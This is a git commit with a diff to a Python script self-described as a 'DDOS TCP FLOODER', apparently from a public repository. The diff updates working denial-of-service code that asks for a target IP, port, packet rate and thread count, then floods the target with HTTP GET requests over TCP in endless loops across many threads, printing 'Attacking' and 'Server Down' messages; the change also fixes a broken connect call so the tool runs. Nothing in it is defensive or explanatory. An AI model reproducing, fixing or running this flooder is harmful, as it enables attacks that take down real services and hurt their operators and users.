5c9990fd8d1da650e0eec8578348c8adc6590042
KunFay99 <kaffayukiffu@gmail.com>
2024-11-11 09:39:04 +0700

    Update K0MA-DD0S.py

--- K0MA-DD0S.py
+++ K0MA-DD0S.py
@@ -1,5 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
+# DDOS TCP FLOODER
+# v0.0.2
 import os
 import socket
 import requests
@@ -62,34 +64,34 @@ acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
 "Accept-Language: en-US,en;q=0.5\r\n"]
 
-url = str(input('\033[96m[\033[1m+]\033[96m Target:  \033[0m'))
-host = int(input('\033[96m[\033[1m+]\033[96m GET:  \033[0m'))
-pack = int(input('\033[96m[\033[1m+]\033[96m Packet/s:  \033[0m'))
-thread = int(input('\033[96m[\033[1m+]\033[96 Threads:  \033[0m'))
+ip = str(input('[+] Target: '))
+port = int(input('[+] Port: '))
+pack = int(input('[+] Packet/s: '))
+thread = int(input('[+] Threads: '))
 def start():
     global useragents, ref, acceptall
     hh = random._urandom(3016)
     xx = int(0)
     useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
     accept = random.choice(acceptall)
-    reffer = "Referer: "+random.choice(ref)+str(url) + "\r\n"
+    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
     content    = "Content-Type: application/x-www-form-urlencoded\r\n"
     length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
-    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(url), int(host))
+    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
     main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((str(url),int(host.GET)))
+            s.connect((str(ip),int(port)))
             s.send(str.encode(main_req))
             for i in range(pack):
                 s.send(str.encode(main_req))
             xx += random.randint(0, int(pack))
-            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(url), int(host), xx))
+            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
         except:
             s.close()
-            print("\033[33m[\033[1m-\033[33m]\033[92mServer Down!")
+            print('[+] Server Down.')
 
 for x in range(thread):
-  thred = threading.Thread(target=start)
-  thred.start()
+    thred = threading.Thread(target=start)
+    thred.start()
